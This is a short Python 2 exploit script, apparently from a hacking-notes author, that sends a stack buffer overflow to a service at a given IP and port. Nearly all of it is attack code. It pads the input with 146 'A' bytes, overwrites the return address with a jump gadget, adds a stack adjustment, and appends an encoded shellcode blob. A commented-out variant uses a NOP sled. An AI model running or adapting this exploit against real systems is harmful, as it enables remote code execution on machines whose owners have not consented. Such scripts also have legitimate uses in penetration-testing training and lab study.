#!/usr/bin/python2
#Johnny Chafla | @jch | @hacknotes
#site https://hacknotes.github.io/

import socket, sys
from struct import pack

if len(sys.argv) < 3:
	print ("\n Usage: python " + sys.argv[0] + " <ip address> <port>\n")
	sys.exit(0)


ipADD = sys.argv[1]
rPort = sys.argv[2]

shellcode = (
"\xda\xd0\xd9\x74\x24\xf4\xba\xc0\x61\xbc\xa3\x5b\x2b\xc9\xb1"
"\x52\x83\xc3\x04\x31\x53\x13\x03\x93\x72\x5e\x56\xef\x9d\x1c"
"\x99\x0f\x5e\x41\x13\xea\x6f\x41\x47\x7f\xdf\x71\x03\x2d\xec"
"\xfa\x41\xc5\x67\x8e\x4d\xea\xc0\x25\xa8\xc5\xd1\x16\x88\x44"
"\x52\x65\xdd\xa6\x6b\xa6\x10\xa7\xac\xdb\xd9\xf5\x65\x97\x4c"
"\xe9\x02\xed\x4c\x82\x59\xe3\xd4\x77\x29\x02\xf4\x26\x21\x5d"
"\xd6\xc9\xe6\xd5\x5f\xd1\xeb\xd0\x16\x6a\xdf\xaf\xa8\xba\x11"
"\x4f\x06\x83\x9d\xa2\x56\xc4\x1a\x5d\x2d\x3c\x59\xe0\x36\xfb"
"\x23\x3e\xb2\x1f\x83\xb5\x64\xfb\x35\x19\xf2\x88\x3a\xd6\x70"
"\xd6\x5e\xe9\x55\x6d\x5a\x62\x58\xa1\xea\x30\x7f\x65\xb6\xe3"
"\x1e\x3c\x12\x45\x1e\x5e\xfd\x3a\xba\x15\x10\x2e\xb7\x74\x7d"
"\x83\xfa\x86\x7d\x8b\x8d\xf5\x4f\x14\x26\x91\xe3\xdd\xe0\x66"
"\x03\xf4\x55\xf8\xfa\xf7\xa5\xd1\x38\xa3\xf5\x49\xe8\xcc\x9d"
"\x89\x15\x19\x31\xd9\xb9\xf2\xf2\x89\x79\xa3\x9a\xc3\x75\x9c"
"\xbb\xec\x5f\xb5\x56\x17\x08\xb0\xaf\x49\xd4\xac\xad\x75\xe5"
"\x97\x3b\x93\x8f\xf7\x6d\x0c\x38\x61\x34\xc6\xd9\x6e\xe2\xa3"
"\xda\xe5\x01\x54\x94\x0d\x6f\x46\x41\xfe\x3a\x34\xc4\x01\x91"
"\x50\x8a\x90\x7e\xa0\xc5\x88\x28\xf7\x82\x7f\x21\x9d\x3e\xd9"
"\x9b\x83\xc2\xbf\xe4\x07\x19\x7c\xea\x86\xec\x38\xc8\x98\x28"
"\xc0\x54\xcc\xe4\x97\x02\xba\x42\x4e\xe5\x14\x1d\x3d\xaf\xf0"
"\xd8\x0d\x70\x86\xe4\x5b\x06\x66\x54\x32\x5f\x99\x59\xd2\x57"
"\xe2\x87\x42\x97\x39\x0c\x62\x7a\xeb\x79\x0b\x23\x7e\xc0\x56"
"\xd4\x55\x07\x6f\x57\x5f\xf8\x94\x47\x2a\xfd\xd1\xcf\xc7\x8f"
"\x4a\xba\xe7\x3c\x6a\xef"
)

if __name__=='__main__':
	#pack es donde va la dierccion del salto al ESP
  #Este es retrocediendo la PILA
	buffer = "A"*146 + pack("<L", 0x080414C3) + "\x83\xEC\x10" + shellcode
  #Este es con nops
  #buffer = "A"*2606 + pack("<L", 0x5f4a358f) + "\x90"*16 + shellcode
	try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ipADD, int(rPort)))
                miData = buffer + '\r\n'
                s.send(miData)
                data = s.recv(1024)
	except:
		print "\n [!] Error...\n"
		sys.exit(1)
